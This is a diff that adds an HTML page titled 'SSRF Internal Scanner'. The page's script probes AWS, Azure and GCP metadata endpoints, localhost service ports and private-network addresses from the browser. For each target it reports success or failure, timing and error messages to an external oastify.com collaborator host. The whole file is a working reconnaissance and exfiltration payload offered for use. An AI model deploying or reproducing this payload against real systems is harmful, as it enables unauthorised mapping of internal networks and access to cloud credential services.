@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SSRF Internal Scanner</title>
+</head>
+<body>
+    <h1>Scanning internal network...</h1>
+    <script>
+    const collab = 'https://84ad72dbts23ogvbhgx7fmhykpqge97xw.oastify.com';
+    
+    // List of internal targets to probe
+    const targets = [
+        'http://169.254.169.254/latest/meta-data/',          // AWS Metadata
+        'http://169.254.169.254/metadata/instance?api-version=2017-08-01', // Azure
+        'http://metadata.google.internal/computeMetadata/v1/', // GCP (needs header)
+        'http://127.0.0.1:80',
+        'http://127.0.0.1:443',
+        'http://127.0.0.1:8080',
+        'http://127.0.0.1:8443',
+        'http://127.0.0.1:9200',  // Elasticsearch
+        'http://127.0.0.1:5601',  // Kibana
+        'http://127.0.0.1:3000',  // Grafana, Node apps
+        'http://10.0.0.1:80',
+        'http://10.0.0.1:8080',
+        'http://172.16.0.1:80',
+        'http://172.16.0.1:8080',
+        'http://192.168.1.1:80',
+        'http://192.168.1.1:8080'
+    ];
+
+    targets.forEach(url => {
+        const start = Date.now();
+        // Use no-cors to avoid CORS blocking, and catch errors
+        fetch(url, { mode: 'no-cors', cache: 'no-cache' })
+            .then(() => {
+                // Connection succeeded (even if we can't read response)
+                const time = Date.now() - start;
+                fetch(collab + '/success?url=' + encodeURIComponent(url) + '&time=' + time);
+            })
+            .catch(err => {
+                // Connection failed
+                const time = Date.now() - start;
+                fetch(collab + '/fail?url=' + encodeURIComponent(url) + '&time=' + time + '&error=' + encodeURIComponent(err.message));
+            });
+    });
+    </script>
+</body>
+</html>
